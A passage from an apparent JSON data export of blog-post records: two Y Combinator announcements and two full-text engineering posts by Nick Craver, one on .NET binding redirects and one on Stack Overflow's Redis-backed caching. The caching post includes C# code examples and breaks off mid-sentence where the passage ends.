"https://www.ycombinator.com/blog/content/images/2023/04/summerconf.png", "profile": 1, "updated_on": "2023-04-12T16:23:37Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 12162.27023, "slug": "announcing-the-yc-summer-conference-for-students-interested-in-startups-140", "topics": [58, 59, 54]}}, {"model": "app.post", "pk": 141, "fields": {"title": "Meet the YC Winter 2023 Batch", "link": "https://www.ycombinator.com/blog/meet-the-yc-winter-2023-batch/", "source": 1, "normalized_link": "www.ycombinator.com/blog/meet-the-yc-winter-2023-batch", "summary": "Today, we're kicking off our 36th Demo Day \u2014 featuring founders from over 250 startups, building across a variety of verticals including B2B/enterprise, fintech, healthcare, consumer, climate, and more.", "content": "", "cover_photo_url": "https://www.ycombinator.com/blog/content/images/2023/04/BlogTwitter-Image-Template--2-1024_1.png", "profile": 1, "updated_on": "2023-04-05T15:30:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 12148.7587411, "slug": "meet-the-yc-winter-2023-batch-141", "topics": [60, 54]}}, {"model": "app.post", "pk": 142, "fields": {"title": "Binding Redirects", "link": "https://nickcraver.com/blog/2020/02/11/binding-redirects/", "source": 1, "normalized_link": "nickcraver.com/blog/2020/02/11/binding-redirects", "summary": " This isn\u2019t part of the series on Stack Overflow\u2019s architecture, but is a topic that has bitten us many times. Hopefully, some of this information helps you sort out issues you hit.  You\u2019re probably here because of an error like this:  Could not load file or assembly \u2018System.<\u2026>, Version=4.x.x.x, Culture=neutral, PublicKeyToken=<\u2026>\u2019 or one of its dependencies. The system cannot find the file specified.  And you likely saw a build warning like this:  warning MSB3277: Found conflicts between different versions of \u201cSystem.<\u2026>\u201d that could not be resolved.  Whelp, you\u2019re not alone. We\u2019re thinking about starting a survivors group. The most common troublemakers here are:  System.Memory (NuGet link) System.Net.Http (NuGet link) System.Numerics.Vectors (NuGet link) System.Runtime.CompilerServices.Unsafe (NuGet link) System.ValueTuple (NuGet link)  If you just want out of this fresh version of DLL Hell you\u2019ve found yourself in\u2026 The best fix The best fix is \u201cgo to .NET Core\u201d. Since .NET Framework (e.g. 4.5, 4.8, etc.) has a heavy backward compatibility burden, meaning that the assembly loader itself is basically made of unstable plutonium with a hair trigger coated in flesh eating bacteria behind a gate made of unobtanium above a moat of napalm filled with those jellyfish that kill you\u2026that won\u2019t ever really be fixed. However, .NET Core\u2019s simplified assembly loading means it just works. I\u2019m not saying a migration to .NET Core is trivial, that depends on your situation, but it is generally the best long-term play. We\u2019re almost done porting Stack Overflow to .NET Core, and this kind of pain is one of the things we\u2019re very much looking forward to not fighting ever again. The fix if you\u2019re using .NET Framework The fix for .NET Framework is \u201cbinding redirects\u201d. When you are trying to load an assembly (and if it\u2019s strongly named, like the ones in the framework and many libs are), it\u2019ll try to load the specific version you specified. Unless it\u2019s told to load another (likely newer) version. Think of it as \u201cHey little buddy. It\u2019s okay! Don\u2019t cry! That API you want is still available\u2026it\u2019s just over here\u201d. I don\u2019t want to replicate the official documentation here since it\u2019ll be updated much better by the awesome people on Microsoft Docs these days. Your options to fix it are:  Enable <AutoGenerateBindingRedirects> (this doesn\u2019t work for web projects - it doesn\u2019t handle web.config)      Note: this isn\u2019t always perfect. It doesn\u2019t handle all transitive cases especially around multi-targeting and conditional references.   Build with Visual Studio and hope it has warnings and a click to fix (this usually works)      Note: this isn\u2019t always perfect either, hence the \u201chope\u201d.   Manually edit your *.config file.      This is the surest way (and what Visual Studio is doing above), but also the most manual and/or fun on upgrades.    Unfortunately, what that \u201cmanual editing\u201d article doesn\u2019t mention is the assembly versions are not the NuGet versions. For instance, System.Runtime.CompilerServices.Unsafe 4.7.0 on NuGet is assembly version 4.0.6.0. The assembly version is what matters. The easiest way I use to figure this out on Windows is the NuGet Package Explorer (Windows Store link - easiest install option) maintained by Claire Novotny. Either from within NPE\u2019s feed browser or from NuGet.org (there\u2019s a \u201cDownload package\u201d option in the right sidebar), open the package. Select the framework you\u2019re loading (they should all match really) and double click the DLL. It\u2019ll have a section that says \u201cStrong Name: Yes, version: 4.x.x.x\u201d For example, if you had libraries wanting various versions of System.Numerics.Vectors, the most likely fix is to prefer the latest (as of writing this, 4.7.0 on NuGet which is assembly version 4.0.6.0 from earlier). Part of your config would look something like this: <configuration>   <runtime>     <assemblyBinding xmlns=\"urn:schemas-microsoft-com:asm.v1\">       <dependentAssembly>         <assemblyIdentity name=\"System.Runtime.CompilerServices.Unsafe\" publicKeyToken=\"b03f5f7f11d50a3a\" culture=\"neutral\"/>         <bindingRedirect oldVersion=\"0.0.0.0-4.0.6.0\" newVersion=\"4.0.6.0\"/>       </dependentAssembly>       <!-- ...and maybe some more... -->     </assemblyBinding>   </runtime> </configuration>  This means \u201canyone asking for any version before 4.0.6.0, send them to that one\u2026it\u2019s what in my bin\\ folder\u201d. For a quick practical breakdown of these fields:  name: The name of the strongly named DLL publicKeyToken: The public key of the strongly named DLL (this comes from key used to sign it) culture: Pretty much always neutral oldVersion: A range of versions, starting at 0.0.0.0 (almost always what you want) means \u201credirect everything from X to Y\u201d newVersion: The new version to \u201credirect\u201d to, instead of any old one (usually matches end of the oldVersion range)  When do I need to do this? Any of the above approaches to fixing it need to be revisited when a conflict arises again. This can happen when:  Updating a NuGet package (Remember: NuGet uses transitive dependencies\u2026so anything in the chain can cause it) Updating your target framework  Note that binding redirects are to remedy differences in the reference chain (more on that below), so when all of your things reference the same version down their transitive chains, you don\u2019t need one. So sometimes removing a binding redirect is the quick fix in an upgrade. But seriously, .NET Core. Of all the reasons we\u2019re migrating over at Stack Overflow, binding redirects are in my top 5. We\u2019ve lost soooo many days to this over the years. What\u2019s going on? Why do I need this? The overall problem is that you have two different libraries ultimately wanting two different versions of one of these (and potentially anything else \u2014 this is a general case the three above are just the most common). Since dependencies are transitive, this means you just reference a library and the tooling will get what it needs. (That\u2019s what <PackageReference> does in your projects.) But what that means is you could have library A \u2192 B \u2192 System.Vectors (version 1.0), and another reference to something like D \u2192 E \u2192 F \u2192 System.Vectors (version 1.2). Uh oh, we have two things wanting two different versions. You may be thinking (for Windows) \u201cbut\u2026won\u2019t they be the same file in the bin\\ directory? How can you have both? How does that even work?\u201d You\u2019re not crazy. You\u2019re hitting the error because one of those two versions won. It should be the newer one. Okay, so it\u2019s broken. The code wanting the other version is what\u2019s erroring. But maybe not on startup! That\u2019s another fun part. It happens the first time you touch a type that references types in that assembly. Bonus: if this is in a static constructor, that type you\u2019re trying to touch will most likely disappear. Poof. Gone. What does the app do without it? WHO KNOWS?! But buckle up, because you can bet your butt it\u2019ll be fun. Imagine the compiler said \u201cokay\u201d but that type wasn\u2019t really there later\u2026because that\u2019s basically the situation you find yourself in. So, we need to redirect things. In theory, the framework takes care of some of these indirections, but with some pieces deployed via NuGet it\u2019s a bit of a mess and it\u2019s far from perfect. That\u2019s why you\u2019re here. I hope this helped. In some versions of the framework, things aren\u2019t quite right in what shipped - the few libraries up top are troublemakers more than all the others for this reason. Those are the versions that were glitched in various versions of .NET Framework. \u201cWhy don\u2019t you fix .NET 4.??\" is a question Microsoft gets a lot. They did \u2014 it's called \"the next version\". Being unable to break people, that's the only real way to fix it and not cause *other* damage. Keep in mind, we're talking about over a billion computers to update here. So, when you update to .NET 4.7.2 (most of the redirects are fixed here), .NET 4.8, etc. \u2014 more and more of the cases do go away. But with NuGet and later versions...yeah, they can come back. Generally speaking though, the later version of .NET Framework you're targeting and running on, the better. There has been progress. Anyway, I hope this helps some people out there. I should have written this up 5 years ago, and wish I had this info available to me 10 years ago. Good luck on fixing whatever brought you here!", "content": "", "cover_photo_url": null, "profile": 2, "updated_on": "2020-02-11T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 9941.4387411, "slug": "binding-redirects-142", "topics": [61]}}, {"model": "app.post", "pk": 143, "fields": {"title": "Stack Overflow: How We Do App Caching - 2019 Edition", "link": "https://nickcraver.com/blog/2019/08/06/stack-overflow-how-we-do-app-caching/", "source": 1, "normalized_link": "nickcraver.com/blog/2019/08/06/stack-overflow-how-we-do-app-caching", "summary": " This is #5 in a very long series of posts on Stack Overflow\u2019s architecture. Previous post (#4): Stack Overflow: How We Do Monitoring - 2018 Edition  So\u2026caching. What is it? It\u2019s a way to get a quick payoff by not re-calculating or fetching things over and over, resulting in performance and cost wins. That\u2019s even where the name comes from, it\u2019s a short form of the \u201cca-ching!\u201d cash register sound from the dark ages of 2014 when physical currency was still a thing, before Apple Pay. I\u2019m a dad now, deal with it. Let\u2019s say we need to call an API or query a database server or just take a bajillion numbers (Google says that\u2019s an actual word, I checked) and add them up. Those are all relatively crazy expensive. So we cache the result \u2013 we keep it handy for re-use. Why Do We Cache? I think it\u2019s important here to discuss just how expensive some of the above things are. There are several layers of caching already in play in your modern computer.  As a concrete example, we\u2019re going to use one of our web servers which currently houses a pair of Intel Xeon E5-2960 v3 CPUs\u00a0and 2133MHz DIMMs. Cache access is a \u201chow many cycles\u201d feature of a processor, so by knowing that we always run at 3.06GHz (performance power mode), we can derive the latencies (Intel architecture reference here \u2013 these processors are in the Haswell generation):  L1 (per core): 4 cycles or ~1.3ns latency - 12x 32KB+32KB L2 (per core): 12 cycles or ~3.92ns latency - 12x 256KB L3 (shared): 34 cycles or ~11.11ns latency - 30MB System memory: ~100ns latency - 8x 8GB  Each cache layer is able to store more, but is farther away. It\u2019s a trade-off in processor design with balances in play. For example, more memory per core means (almost certainly) on average putting it farther away on the chip from the core and that has costs in latency, opportunity costs, and power consumption. How far an electric charge has to travel has substantial impact at this scale; remember that distance is multiplied by billions every second. And I didn\u2019t get into disk latency above because we so very rarely touch disk. Why? Well, I guess to explain that we need to\u2026look at disks. Ooooooooh shiny disks! But please don\u2019t touch them after running around in socks. At Stack Overflow, anything production that\u2019s not a backup or logging server is on SSDs. Local storage generally falls into a few tiers for us:  NVMe SSD: ~120\u03bcs (source) SATA or SAS SSD: ~400\u2013600\u03bcs (source) Rotational HDD: 2\u20136ms (source)  These numbers are changing all the time, so don\u2019t focus on exact figures too much. What we\u2019re trying to evaluate is the magnitude of the difference of these storage tiers. Let\u2019s go down the list (assuming the lower bound of each, these are best case numbers):  L1: 1.3ns L2: 3.92ns (3x slower) L3: 11.11ns (8.5x slower) DDR4 RAM: 100ns (77x slower) NVMe SSD: 120,000ns (92,307x slower) SATA/SAS SSD: 400,000ns (307,692x slower) Rotational HDD: 2\u20136ms (1,538,461x slower) Microsoft Live Login: 12 redirects and 5s (3,846,153,846x slower, approximately)  If numbers aren\u2019t your thing, here\u2019s a neat open source visualization (use the slider!)\u00a0by Colin Scott\u00a0(you can even go see how they\u2019ve evolved over time \u2013 really neat):  With those performance numbers and a sense of scale in mind, let\u2019s add some numbers that matter every day. Let\u2019s say our data source is X, where what X is doesn\u2019t matter. It could be SQL, or a microservice, or a macroservice, or a leftpad service, or Redis, or a file on disk, etc. The key here is that we\u2019re comparing that source\u2019s performance to that of RAM. Let\u2019s say our source takes\u2026  100ns (from RAM - fast!) 1ms (10,000x slower) 100ms (100,000x slower) 1s (1,000,000x slower)  I don\u2019t think we need to go further to illustrate the point: even things that take only 1 millisecond are way, way slower than local RAM. Remember: millisecond, microsecond, nanosecond \u2013 just in case anyone else forgets that a 1000ns != 1ms like I sometimes do\u2026 But not all cache is local. For example, we use Redis for shared caching behind our web tier (which we\u2019ll cover in a bit). Let\u2019s say we\u2019re going across our network to get it. For us, that\u2019s a 0.17ms roundtrip and you need to also send some data. For small things (our usual), that\u2019s going to be around 0.2\u20130.5ms total. Still 2,000\u20135,000x slower than local RAM, but also a lot faster than most sources. Remember, these numbers are because we\u2019re in a small local LAN.  Cloud latency will generally be higher, so measure to see your latency. When we get the data, maybe we also want to massage it in some way. Probably Swedish. Maybe we need totals, maybe we need to filter, maybe we need to encode it, maybe we need to fudge with it randomly just to trick you. That was a test to see if you\u2019re still reading. You passed! Whatever the reason, the commonality is generally we want to do <x> once, and not every time we serve it. Sometimes we\u2019re saving latency and sometimes we\u2019re saving CPU. One or both of those are generally why a cache is introduced. Now let\u2019s cover the flip side\u2026 Why Wouldn\u2019t We Cache? For everyone who hates caching, this is the section for you!  Yes, I\u2019m totally playing both sides. Given the above and how drastic the wins are, why wouldn\u2019t we cache something? Well, because every single decision has trade-offs. Every. Single. One. It could be as simple as time spent or opportunity cost, but there\u2019s still a trade-off. When it comes to caching, adding a cache comes with some costs:  Purging values if and when needed (cache invalidation \u2013 we\u2019ll cover that in a few) Memory used by the cache Latency of access to the cache (weighed against access to the source) Additional time and mental overhead spent debugging something more complicated  Whenever a candidate for caching comes up (usually with a new feature), we need to evaluate these things\u2026and that\u2019s not always an easy thing to do. Although caching is an exact science, much like astrology, it\u2019s still tricky. Here at Stack Overflow, our architecture has one overarching theme: keep it as simple as possible. Simple is easy to evaluate, reason about, debug, and change if needed. Only make it more complicated if and when it needs to be more complicated. That includes cache. Only cache if you need to. It adds more work and more chances for bugs, so unless it\u2019s needed: don\u2019t. At least, not yet. Let\u2019s start by asking some questions.  Is it that much faster to hit cache? What are we saving? Is it worth the storage? Is it worth the cleanup of said storage (e.g. garbage collection)? Will it go on the large object heap immediately? How often do we have to invalidate it? How many hits per cache entry do we think we\u2019ll get? Will it interact with other things that complicate invalidation? How many variants will there be? Do we have to allocate just to calculate the key? Is it a local or remote cache? Is it shared between users? Is it shared between sites? Does it rely on quantum entanglement or does debugging it just make you think that? What color is the cache?  All of these are questions that come up and affect caching decisions. I\u2019ll try and cover them through this post. Layers of Cache at Stack Overflow We have our own \u201cL1\u201d/\u201dL2\u201d caches here at Stack Overflow, but I\u2019ll refrain from referring to them that way to avoid confusion with the CPU caches mentioned above. What we have is several types of cache. Let\u2019s first quickly cover local and memory caches here for terminology before a deep dive into the common bits used by them:  \u201cGlobal Cache\u201d: In-memory cache (global, per web server, and backed by Redis on miss)      Usually things like a user\u2019s top bar counts, shared across the network This hits local memory (shared keyspace), and then Redis (shared keyspace, using Redis database 0)   \u201cSite Cache\u201d: In-memory cache (per site, per web server, and backed by Redis on miss)      Usually things like question lists or user lists that are per-site This hits local memory (per-site keyspace, using prefixing), and then Redis (per-site keyspace, using Redis databases)   \u201cLocal Cache\u201d: In-memory cache (per site, per web server, backed by nothing)      Usually things that are cheap to fetch, but huge to stream and the Redis hop isn\u2019t worth it This hits local memory only (per-site keyspace, using prefixing)    What do we mean by \u201cper-site\u201d? Stack Overflow and the Stack Exchange network of sites is a multi-tenant architecture. Stack Overflow is just one of many hundreds of sites. This means one process on the web server hosts all the sites, so we need to split up the caching where needed. And we\u2019ll have to purge it (we\u2019ll cover how that works too). Redis Before we discuss how servers and shared cache work, let\u2019s quickly cover what the shared bits are built on: Redis. So what is Redis? It\u2019s an open source key/value data store with many useful data structures, additional publish/subscriber mechanisms, and rock solid stability. Why Redis and not <something else>? Well, because it works. And it works well. It seemed like a good idea when we needed a shared cache. It\u2019s been incredibly rock solid. We don\u2019t wait on it \u2013 it\u2019s incredibly fast. We know how it works. We\u2019re very familiar with it. We know how to monitor it. We know how to spell it. We maintain one of the most used open source libraries for it. We can tweak that library if we need. It\u2019s a piece of infrastructure we just don\u2019t worry about. We basically take it for granted (though we still have an HA setup of replicas \u2013 we\u2019re not completely crazy). When making infrastructure choices, you don\u2019t just change things for perceived possible value. Changing takes effort, takes time, and involves risk. If what you have works well and does what you need, why invest that time and effort and take a risk? Well\u2026you don\u2019t. There are thousands of better things you can do with your time. Like debating which cache server is best! We have a few Redis instances to separate concerns of apps (but on the same set of servers), here\u2019s an example of what one looks like:  For the curious, some quick stats from last Tuesday (2019-07-30) This is across all instances on the primary boxes (because we split them up for organization, not performance\u2026one instance could handle everything we do quite easily):  Our Redis physical servers have 256GB of memory, but less than 96GB used. 1,586,553,473 commands processed per day (3,726,580,897 commands and 86,982 per second peak across all instances \u2013 due to replicas) Average of 2.01% CPU utilization (3.04% peak) for the entire server (< 1% even for the most active instance) 124,415,398 active keys (422,818,481 including replicas) Those numbers are across 308,065,226 HTTP hits (64,717,337 of which were question pages)  Note: None of these are Redis limited \u2013 we\u2019re far from any limits. It\u2019s just how much activity there is on our instances. There are also non-cache reasons we use Redis, namely: we also use the pub/sub mechanism for our websockets that provide realtime updates on scores, rep, etc. Redis 5.0 added Streams which is a perfect fit for our websockets and we\u2019ll likely migrate to them when some other infrastructure pieces are in place (mainly limited by Stack Overflow Enterprise\u2019s version at the moment). In-Memory & Redis Cache Each of the above has an in-memory cache component and some have a backup in that lovely Redis server. In-memory is simple enough, we\u2019re just caching things in\u2026ya know, memory. In ASP.NET MVC 5, this used to be HttpRuntime.Cache. These days, in preparation for our ASP.NET Core move, we\u2019ve moved on to MemoryCache. The differences are tiny and don\u2019t matter much; both generally provide a way to cache an object for some duration of time. That\u2019s all we need here. For the above caches, we choose a \u201cdatabase ID\u201d. These relate to the sites we have on the Stack Exchange Network and come from our Sites database table. Stack Overflow is 1, Server Fault is 2, Super User is 3, etc. For local cache, you could approach it a few ways. Ours is simple: that ID is part of the cache key. For Global Cache (shared), the ID is zero. We further (for safety) prefix each cache to avoid conflicts with general key names from whatever else might be in these app-level caches.  An example key would be: prod:1-related-questions:1234  That would be the related questions in the sidebar for Question 1234 on Stack Overflow (ID: 1). If we\u2019re only in-memory, serialization doesn\u2019t matter and we can just cache any object. However, if we\u2019re sending that cache object somewhere (or getting one back from somewhere), we need to serialize it. And fast! That\u2019s where protobuf-net written by our own Marc Gravell comes in. Protobuf is a binary encoding format that\u2019s tremendously efficient in both speed and allocations. A simple object we want to cache may look like this: public class RelatedQuestionsCache {     public int Count { get; set; }     public string Html { get; set; } }  With protobuf attributes to control serialization, it looks like this: [ProtoContract] public class RelatedQuestionsCache {     [ProtoMember(1)] public int Count { get; set; }     [ProtoMember(2)] public string Html { get; set; } }  So let\u2019s say we want to cache that object in Site Cache. The flow looks like this (code simplified a bit): public T Get<T>(string key) {     // Transform to the shared cache key format, e.g. \"x\" into \"prod:1-x\"     var cacheKey = GetCacheKey(key);     // Do we have it in memory?     var local = memoryCache.Get<RedisWrapper>(cacheKey);     if (local != null)     {         // We've got it local - nothing more to do.         return local.GetValue<T>();     }     // Is Redis connected and readable? This makes Redis a fallback and not critical     if (redisCache.CanRead(cacheKey)) // Key is passed here for the case of Redis Cluster     {     \tvar remote = redisCache.StringGetWithExpiry(cacheKey)         if (remote.Value != null)         {             // Get our shared construct for caching        \t    var wrapper = RedisWrapper.From(remote);             // Set it in our local memory cache so the next hit gets it faster             memoryCache.Set<RedisWrapper>(key, wrapper, remote.Expiry);             // Return the value we found in Redis             return remote.Value;         }     }     // No value found, sad panda     return null; }  Granted, this code is greatly simplified to convey the point, but we\u2019re not leaving anything important out. Why a RedisWrapper<T>? It synonymizes platform concepts by having a value with a TTL (time-to-live) with the value, just like Redis does. It also allows the caching of a null value and makes that handling not special-cased. In other words, you can tell the difference between \u201cIt\u2019s not cached\u201d and \u201cWe looked it up. It was null. We cached that null. STOP ASKING!\u201d If you\u2019re curious about StringGetWithExpiry, it\u2019s a StackExchange.Redis method that returns the value and the TTL in one call by pipelining the commands (not 2 round-trip time costs). A Set<T>\u00a0for caching a value works exactly the same way:  Cache the value in memory. Cache the same value in Redis. (Optionally) Alert the other web servers that the value has been updated and instruct them to flush their copy.  Pipelining I want to take a moment and relay a very important thing here: our Redis connections (via StackExchange.Redis) are pipelined. Think of it like a conveyor belt you can stick something on and it goes somewhere and circles back. You could stick thousands of things in a row on that conveyor belt before the first reaches the destination or comes back. If you put a giant thing on there, it means you have to wait to add other things. The items may be independent, but the conveyor belt is shared. In our case, the conveyor belt is the connection and the items are commands. If a large payload goes on or comes back, it occupies the belt for a bit. This means if you\u2019re waiting on a specific thing but some nasty big item clogs up he works for a second or two, it may cause collateral damage. That\u2019s a timeout. We often see issues filed from people putting tremendous many-megabyte payloads into Redis with low timeouts, but that doesn\u2019t work unless the pipe is very, very fast. They don\u2019t see the many-megabyte command timing out\u2026they usually see things waiting behind it timing out. It\u2019s important to realize that a pipeline is just like any pipe outside a computer. Whatever its narrowest constraint is, that\u2019s where it\u2019ll bottleneck. Except this is a dynamic pipe, more like a hose that can expand or bend or kink. The bottlenecks are not 100% constant. In practical terms, this can be thread pool exhaustion (either feeding commands in or handling them coming out). Or it may be network bandwidth. And maybe something else is using that network bandwidth impacting us. Remember that at these levels of latency, viewing things at 1Gb/s or 10Gb/s isn\u2019t really using the correct unit of time. For me, it helps to not think in terms of 1Gb/s, but instead in terms of 1Mb/ms. If we\u2019re traversing the network in about a millisecond or less, that payload really does matter and can increase the time taken by very measurable and impactful amounts. That\u2019s all to say: think small here. The limits on any system when you\u2019re dealing with short durations must be considered with relative constraints proportional to the same durations. When we\u2019re talking about milliseconds, the fact that we think of most computing concepts only down to the second is often a factor that confuses thinking and discussion. Pipelining: Retries The pipelined nature is also why we can\u2019t retry commands with any confidence. In this sad world our conveyor belt has turned into the airport baggage pickup loopy thingamajig (also in the dictionary, for the record) we all know and love. You put an bag on the thingamajig. The bag contains something important, probably some really fancy pants. They\u2019re going to someone who you wanted to impress. (We\u2019re using airport luggage as a very reasonably priced alternative to UPS in this scenario.) But Mr. Fancy Pants is super nice and promised to return your bag. So nice. You did your part. The bag went on the thingamajig and went out of sight\u2026and never make it back. Okay\u2026where did it go?!? We don\u2019t know! DAMN YOU BAG! Maybe the bag made it to the lovely person and got lost on the return trip. Or maybe it didn\u2019t. We still don\u2019t know! Should we send it again? What if we\u2019re sending them a second pair of fancy pants? Will they think we think they spill ketchup a lot? That\u2019d be weird. We don\u2019t want to come on too strong. And now we\u2019re just confused and bagless. So let\u2019s talk about something that makes even less sense: cache invalidation. Cache Invalidation I keep referring to purging above, so how\u2019s that work? Redis has a pub/sub feature where you can push a message out and subscribers all receive it (this message goes to all replicas as well). Using this simple concept, we can simply have a cache clearing channel we SUBSCRIBE to. When we want to remove a value early (rather than waiting for TTLs to fall out naturally), we just PUBLISH that key name to our channel and the listener (think event handler here) just purges the key from local cache. The steps are:  Purge the value from Redis via DEL or UNLINK. Or, just replace the value with a new one\u2026whatever state we\u2019re after. Broadcast the key to the purge channel.  Order is important, because reversing these would create a race and end up in a re-fetch of the old value sometimes. Note that we\u2019re not pushing the new value out. That\u2019s not the goal. Maybe web servers 1\u20135 that had the value cache won\u2019t even ask for it again this duration\u2026so let\u2019s not be over-eager and wasteful. All we\u2019re making them do is get it from Redis if and when it\u2019s asked for. Combining Everything: GetSet If you look at the above, you\u2019d think we\u2019re doing this a lot: var val = Current.SiteCache.Get<string>(key); if (val == null) {     val = FetchFromSource();     Current.SiteCache.Set(key, val, Timespan.FromSeconds(30)); } return val;  But here\u2019s where we can greatly improve on things. First, it\u2019s repetitive. Ugh. But more importantly, that code will result in hundreds of simultaneous calls to FetchFromSource() at scale when the cache expires. What if that fetch is heavy? Presumably it\u2019s somewhat\u00a0expensive, since we\u2019ve decided to cache it in the first place. We need a better plan. This is where our most common approach comes in: GetSet<T>(). Okay, so naming is hard. Let\u2019s just agree everyone has regrets and move on. What do we really want to do here?  Get a value if it\u2019s there Calculate or fetch a value if it\u2019s not there (and shove it in cache) Prevent calculating or fetching the same value many times Ensure users wait as little as possible  We can use some attributes about who we are and what we do to optimize here. Let\u2019s say you load the web page now, or a second ago, or 3 seconds from now. Does it matter? Is the Stack Overflow question going to change that much? The answer is: only if there\u2019s anything to notice. Maybe you made an upvote, or an edit, or a comment, etc. These are things you\u2019d notice. We must refresh any caches that pertain to those kinds of activities for you. But for any of hundreds of other users simultaneously loading that page, skews in data are imperceptible. That means we have wiggle room. Let\u2019s exploit that wiggle room for performance. Here\u2019s what GetSet<T> looks like today (yes, there\u2019s an equivalent-ish async\u00a0version): public static T GetSet<T>(     this ImmediateSiteCache cache,     string key,     Func<T, MicroContext, T> lookup,     int durationSecs,     int serveStaleDataSecs,     GetSetFlags flags = GetSetFlags.None,     Server server = Server.PreferMaster)  The key arguments to this are durationSecs and serveStaleDataSecs. A call often looks something like this (it\u2019s a contrived example for simplicity of discussion): var lookup = Current.SiteCache.GetSet<Dictionary<int, string>>(\"User:DisplayNames\",     (old, ctx) => ctx.DB.Query<(int Id, string DisplayName)>(\"Select Id, DisplayName From Users\")                        .ToDictionary(i => i.Id),      60, 5*60);  This call goes to the Users table and caches an Id\u00a0-> DisplayName lookup (we don\u2019t actually do this, I just needed a simple example). The key part is the values at the end. We\u2019re saying \u201ccache for 60 seconds, but serve stale for 5 minutes\u201d. The behavior is that for 60 seconds, any hits against this cache only return it. But we keep the value in memory (and Redis) for 6 minutes total. In the time between 60 seconds and 6 minutes (from the time cached), we\u2019ll happily still serve the value to users. But, we\u2019ll kick off a background refresh on another thread at the same time so future users get a fresh value. Rinse and repeat. Another important detail here is we keep a per-server local lock table (a ConcurrentDictionary) that prevents two calls from trying to run that lookup function and getting the value at the same time. For example, there\u2019s no win in querying the database 400 times for 400 users. Users 2 though 400 are better off waiting on the first cache to complete and our database server isn\u2019t kinda sorta murdered in the process. Why a ConcurrentDictionary<string, object>\u00a0instead of say a HashSet<string>? Because we want to lock on the object\u00a0in that dictionary for subsequent callers. They\u2019re all waiting on the same fetch and that object\u00a0represents our fetch. If you\u2019re curious about that MicroContext, that goes back to being multi-tenant. Since the fetch may happen on a background thread, we need to know what it was for. Which site? Which database? What was the previous cache value? Those are things we put on the context before passing it to the background thread for the lookup to grab a new value. Passing the old value also lets us handle an error case as desired, e.g. logging the error and still returning the old value, because giving a user slightly out-of-date data is always always better than an error page. We choose per call here though. If returning the old value is bad for some reason \u2013 just don\u2019t do that. Types and Things A question I often get is how do we use DTOs (data transfer objects)? In short, we don\u2019t. We only use additional types and allocations when we need to. For example, if we can run a .Query<MyType>(\"Select...\"); from Dapper and stick it into cache, we will. There\u2019s little reason to create another type just to cache. If it makes sense to cache the type that\u2019s 1:1 with a database table (e.g. Post for the Posts table, or User for the Users table), we\u2019ll cache that. If there\u2019s some subtype or combination of things that are the columns from a combined query, we\u2019ll just .Query<T> as that type, populating from those columns, and cache that. If that still sounds abstract, here\u2019s a more concrete example: [ProtoContract] public class UserCounts {     [ProtoMember(1)] public int UserId { get; }     [ProtoMember(2)] public int PostCount { get; }     [ProtoMember(3)] public int CommentCount { get; } }  public Dictionary<int, UserCounts> GetUserCounts() =>     Current.SiteCache.GetSet<Dictionary<int, UserCounts>>(\"All-User-Counts\", (old, ctx) =>     {         try         {             return ctx.DB.Query<UserCounts>(@\"   Select u.Id UserId, PostCount, CommentCount     From Users u          Cross Apply (Select Count(*) PostCount From Posts p Where u.Id = p.OwnerUserId) p          Cross Apply (Select Count(*) CommentCount From PostComments pc Where u.Id = pc.UserId) pc\")                 .ToDictionary(r => r.UserId);         }         catch(Exception ex)         {             Env.LogException(ex);             return old; // Return the old value         }     }, 60, 5*60);  In this example we are taking advantage of Dapper\u2019s built-in column mapping.  (Note that it sets get-only properties.) The type used is just for this. For example, it could even be private, and make this method take a int userId with the Dictionary<int, UserCount> being a method-internal detail. We\u2019re also showing how T old and the MicroContext are used here. If an error occurs, we log it and return the previous value. So\u2026types. Yeah. We do whatever works. Our philosophy is to not create a lot of types unless they\u2019re useful. DTOs generally don\u2019t come with just the type, but also include a lot of mapping code \u2013 or more magical code (e.g. reflection) that maps across and is subject to unintentional breaks down the line. Keep. It. Simple. That\u2019s all we\u2019re doing here. Simple also means fewer allocations and instantiations. Performance is often the byproduct of simplicity. Redis: The Good Types Redis has a variety of data types. All of the key/value examples thus far use \u201cString\u201d type in Redis. But don\u2019t think of this as a string data type like you\u2019re used to in programming (for example, string in .NET, or in Java). It basically means \u201csome bytes\u201d in the Redis usage. It could be a string, it could be a binary image, or it could be\u2026well, anything you can store in some bytes! But, we use most of the other data types in various ways as well:  Redis Lists are useful for queues like our aggregator or account actions to execute in-order. Redis Sets are useful for unique lists of items like \u201cwhich account IDs are in this alpha test?\u201d (things that are unique, but not ordered). Redis Hashes are useful for things that are dictionary-like, such as \u201cWhat\u2019s the latest activity date for a site?\u201d (where the hash key ID is site and the value is a date). We use this to determine \u201cDo we need to run badges on site X this time?\u201d and other questions. Redis Sorted Sets are useful for ordered things like storing the slowest 100 MiniProfiler traces per route.  Speaking of sorted sets, we need to replace the /users page to be backed by sorted sets (one per reputation time range) with range queries instead. Marc and I planned how to do this at a company meetup in Denver many years ago but keep forgetting to do it\u2026 Monitoring Cache Performance There are a few things to keep an eye on here. Remember those latency factors above? It\u2019s super slow to go off box. When we\u2019re rendering question pages in an average of 18\u201320ms, taking ~0.5ms for a Redis call is a lot. A few calls quickly add up to a significant part of our rendering time. First, we\u2019ll want to keep an eye on this at the page level. For this, we use MiniProfiler to see every Redis call involved in a page load. It\u2019s hooked up with StackExchange.Redis\u2019s profiling API. Here\u2019s an example of what that looks like on a question page, getting my live across-the-network counts for the top bar:  Second, we want to keep an eye on the Redis instances. For that, we use Opserver. Here\u2019s what a single instance looks like:  We have some built-in tools there to analyze key usage and the ability to group them by regex pattern. This lets us combine what we know (we\u2019re the ones caching!) with the data to see what\u2019s eating the most space.  Note: Running such an analysis should only be done on a secondary. It\u2019s very abusive on a master at scale. Opserver will by default run such analysis on a replica and block running it on a master without an override.  What\u2019s Next? .NET Core is well underway here at Stack. We\u2019ve ported most support services and are working on the main applications now. There\u2019s honestly not a lot of cache to the caching layer, but one interesting possibility is Utf8String (which hasn\u2019t landed yet). We cache a lot of stuff in total, lots of tiny strings in various places \u2013 things like \u201cRelated Questions\u201d in the sidebar. If those cache entries were UTF8 instead of the .NET default of UTF16, they\u2019d be half the size. When you\u2019re dealing with hundreds of thousands of strings at any given time, it adds up. Story Time I asked what people wanted to know about caching on Twitter and how failures happen came up a lot. For fun, let\u2019s recall a few that stand out in my mind: Taking Redis Down While Trying to Save It At one point, our Redis primary cache was getting to be 